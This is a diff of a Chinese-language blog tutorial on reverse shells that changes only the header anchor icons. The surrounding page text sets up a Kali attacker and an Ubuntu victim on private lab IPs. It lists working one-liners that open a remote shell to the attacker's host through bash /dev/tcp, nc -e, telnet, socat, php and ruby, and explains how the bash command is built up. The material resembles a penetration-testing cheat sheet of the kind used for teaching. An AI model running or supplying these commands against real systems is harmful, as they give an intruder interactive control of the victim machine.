@@ -346,24 +346,24 @@
 <h1>Reverse Shell实例</h1>
 <p>attacker(kali):<code>192.168.67.128</code></p>
 <p>victim(ubuntu)：<code>192.168.67.129</code></p>
-<h2 id="bash"><a class="header-anchor" href="#bash">¶</a>bash</h2>
+<h2 id="bash"><a class="header-anchor" href="#bash">🍭</a>bash</h2>
 <p>在ubuntu执行：</p>
 <p><code>bash -i &gt;&amp; /dev/tcp/192.168.67.128/2333 0&gt;&amp;1</code></p>
 <p><img src="/2021/02/08/shell/2.png" srcset="/img/loading.gif" alt="2"></p>
 <p>在kali监听：</p>
 <p><img src="/2021/02/08/shell/1.jpg" srcset="/img/loading.gif" alt="1"></p>
 <p>kali连接到ubuntu的shell。下面我们来推导一下这个命令怎么来的：</p>
-<h4 id="实现输出命令"><a class="header-anchor" href="#实现输出命令">¶</a>实现输出命令</h4>
+<h4 id="实现输出命令"><a class="header-anchor" href="#实现输出命令">🍭</a>实现输出命令</h4>
 <p>在Ubuntu输入字符串</p>
 <p><code>echo genius &gt; /dev/tcp/192.168.67.128/2333</code></p>
 <p>kali上</p>
 <p><img src="/2021/02/08/shell/3.jpg" srcset="/img/loading.gif" alt="3"></p>
-<h4 id="实现输入命令"><a class="header-anchor" href="#实现输入命令">¶</a>实现输入命令</h4>
+<h4 id="实现输入命令"><a class="header-anchor" href="#实现输入命令">🍭</a>实现输入命令</h4>
 <p>在kali输入</p>
 <p><img src="/2021/02/08/shell/4.jpg" srcset="/img/loading.gif" alt="4"></p>
 <p>在ubuntu输出</p>
 <p><img src="/2021/02/08/shell/5.jpg" srcset="/img/loading.gif" alt="5"></p>
-<h4 id="实现交互"><a class="header-anchor" href="#实现交互">¶</a>实现交互</h4>
+<h4 id="实现交互"><a class="header-anchor" href="#实现交互">🍭</a>实现交互</h4>
 <p><code> bash -i &gt; /dev/tcp/192.168.67.128/2333</code></p>
 <p>在ubuntu上的命令会在Kali显示执行结果</p>
 <p>ubuntu</p>
@@ -384,15 +384,15 @@
 <p><img src="/2021/02/08/shell/11.png" srcset="/img/loading.gif" alt="11"></p>
 <p>or</p>
 <pre><code class="hljs angelscript">exec /bin/sh <span class="hljs-number">0</span>&lt;/dev/tcp/<span class="hljs-number">192.168</span><span class="hljs-number">.67</span><span class="hljs-number">.128</span>/<span class="hljs-number">2333</span> <span class="hljs-number">1</span>&gt;&amp;<span class="hljs-number">0</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">0</span></code></pre>
-<h2 id="nc"><a class="header-anchor" href="#nc">¶</a>nc</h2>
+<h2 id="nc"><a class="header-anchor" href="#nc">🍭</a>nc</h2>
 <pre><code class="hljs angelscript">nc -e /bin/bash <span class="hljs-number">192.168</span><span class="hljs-number">.67</span><span class="hljs-number">.128</span> <span class="hljs-number">2333</span></code></pre>
-<h2 id="telent"><a class="header-anchor" href="#telent">¶</a>telent</h2>
+<h2 id="telent"><a class="header-anchor" href="#telent">🍭</a>telent</h2>
 <pre><code class="hljs angelscript">telnet <span class="hljs-number">192.168</span><span class="hljs-number">.99</span><span class="hljs-number">.242</span> <span class="hljs-number">1234</span> | /bin/bash | telnet <span class="hljs-number">192.168</span><span class="hljs-number">.67</span><span class="hljs-number">.128</span> <span class="hljs-number">2333</span></code></pre>
-<h2 id="socat"><a class="header-anchor" href="#socat">¶</a>socat</h2>
+<h2 id="socat"><a class="header-anchor" href="#socat">🍭</a>socat</h2>
 <pre><code class="hljs angelscript">socat exec:<span class="hljs-string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:<span class="hljs-number">192.168</span><span class="hljs-number">.67</span><span class="hljs-number">.128</span>:<span class="hljs-number">2333</span></code></pre>
-<h2 id="php"><a class="header-anchor" href="#php">¶</a>php</h2>
+<h2 id="php"><a class="header-anchor" href="#php">🍭</a>php</h2>
 <pre><code class="hljs tcl">php -r &#x27;$sock=fsockopen(<span class="hljs-string">&quot;192.168.67.128&quot;</span>,<span class="hljs-number">2333</span>);<span class="hljs-keyword">exec</span>(<span class="hljs-string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);&#x27;</code></pre>
-<h2 id="ruby"><a class="header-anchor" href="#ruby">¶</a>ruby</h2>
+<h2 id="ruby"><a class="header-anchor" href="#ruby">🍭</a>ruby</h2>
 <pre><code class="hljs pgsql">ruby -rsocket -<span class="hljs-string">e&#x27;f=TCPSocket.open(&quot;192.168.67.128&quot;,2333).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span></code></pre>
 <p>完🚩🚩🚩🚩</p>
 <p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaozi/p/13493010.html">反弹shell的各种姿势</a></p>
